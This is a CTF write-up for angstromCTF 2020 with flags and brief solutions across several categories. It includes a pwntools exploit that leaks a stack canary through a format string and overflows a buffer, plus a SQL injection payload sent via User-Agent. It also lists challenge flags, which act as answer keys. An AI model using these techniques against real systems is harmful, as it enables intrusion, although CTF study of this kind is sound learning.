# angstromCTF 2020

## pwn

### Canary

flag: actf{youre_a_canary_killer_>:(}
string format problem: leak canary with string format then bof

payload:

```lang=c
from pwn import *
flag = p64(0x400787)
r = remote('shell.actf.co',20701)
print(r.recvuntil(" name? "))
payload = '%17$p'
r.sendline(payload)
data = r.recvuntil("\n")
canary = data.split(',')[-1].strip()[:-1]
canary_int = p64(int(canary,16))
print(r.recvuntil("Anything else you want to tell me? "))
payload = "a"*56 + canary_int + 'b'*8 + flag
r.sendline(payload)
r.interactive()
```

#### Reference
[format string wiki](https://en.wikipedia.org/wiki/Printf_format_string)
kaibro edu-ctf
[ctf wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/)
[format string course](https://github.com/qazbnm456/ctf-course/blob/master/slides/w4/format-string.md)

## Web

### Consolation

flag: actf{you_would_n0t_beli3ve_your_eyes}

given a js file below, just find the function that would output the flag

```lang=c
console[_0x4229('0x14', '70CK')](_0x4229('0x38', 'rwU*'));
```

### Secret agent

flag: actf{nyoom_1_4m_sp33d}

simple sql injection(mysql) which reads the payload from user-agent field.

1. Utilize burp-suite to intercept requests.
2. Modify the user-agent to the payload below.


payload

> Roselia' or 1=1 limit 2,1 #

### xmass still stand - not solved

xss attack

### Defund's Crypt - not solved

LFI attack ( image insert reverse shell)

## Reverse

### Windows of Opportunity

flag: actf{ok4y_m4yb3_linux_is_s7ill_b3tt3r}

simply use idapro and will find the flag


### Autorev, Assemble! - Not solved

hundreds of functions with simple comparison
construct the string based on the given functions

### patcherman - Not Solved

patch program(section issue)

## Networking

### wireshark-2

flag: actf{ok_to_b0r0s-4809813}

reconstruct the jpeg file to gain the flag. After inspect the traffic, you'll find a packet with images, extract the image from the packet.

![](https://i.imgur.com/IIucaLx.png =500x300)


#### tools & reference

[wireshark refrence psh,ack](https://osqa-ask.wireshark.org/questions/20423/pshack-wireshark-capture)

[repair jpeg](https://online.officerecovery.com/pixrecovery/)

[eof of jpeg](https://stackoverflow.com/questions/4585527/detect-eof-for-jpg-images)


### ws3

flag: actf{git_good_git_wireshark-123323}

Git packfile reconstruction

Given a pcap file. Inspect the pcap file than you will find several http request / response related to git-receive packet and git-response packet.
These traffic are request and response of files in git directory. To be more specific, the users are trying to fetch the data from remote repo.

[git fetching mechanism](https://stackoverflow.com/questions/27430312/what-does-git-fetch-really-do)

basically, client will first invoke upload-pack to remote repo, the repo will then compare the latest packfile with the uploaded one. Eventuall,y the repo will return those commit, objects that client lack to the client

In conclusion, those objects / commit received from repo contains the flag.

This is the main commit / objects.

![](https://i.imgur.com/6BpFvYh.png)

After reassemble the whole packet, retrieve the packet start from PACK to the end. This will be our packfile.
Save the packfile to .pack extension.

run the command to gain the idx file

> git index-pack *.pack

follow this youtube vedio to reconstruct the objects

https://www.youtube.com/watch?v=cauIy20JhFs

Then simply run git cat-file -p to gain the flag

![](https://i.imgur.com/2BIgoJq.jpg =300x400)


#### reference

[hex to binary](https://tomeko.net/online_tools/hex_to_file.php?lang=en)

[git packfile doc](https://git-scm.com/book/en/v2/Git-Internals-Packfiles)

[packfile structure-1](https://codewords.recurse.com/issues/three/unpacking-git-packfiles)

[packfile structure-2](http://shafiul.github.io/gitbook/7_the_packfile.html)

[unpack packfile](https://www.youtube.com/watch?v=cauIy20JhFs)

[git command](https://www.juduo.cc/technique/62040.html)

[git unpack-objects](https://git-scm.com/docs/git-unpack-objects)


## misc

### inputter

flag: actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}

reverse the code and input the argument with pwntools(arguments are not printable)

We have to solve this challenge through logging the shell and run the program.

Since the argv argument nor the fgets target is printable ascii
we should use pwnlib to tackle the unprintable ascii input issue

```lang=c
from pwn import *
r = process(["./inputter"," \n'\"\a"])
r.sendline("\0")
print(r.recv())
```

### Shifter

flag:actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}

simply implement ceasar cipher + dynamic programming

## Crypto

### keysar

flag: actf{yum_delicious_salad}

keyed ceasar: http://rumkin.com/tools/cipher/caesar-keyed.php